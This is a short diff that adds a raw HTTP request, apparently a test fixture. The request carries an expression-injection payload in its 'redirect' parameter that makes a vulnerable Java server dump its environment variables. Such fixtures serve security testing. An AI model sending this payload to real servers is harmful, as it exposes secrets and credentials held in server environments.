@@ -1,0 +1,4 @@
+GET /a?redirect="${T(java.lang.System).getenv()}" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
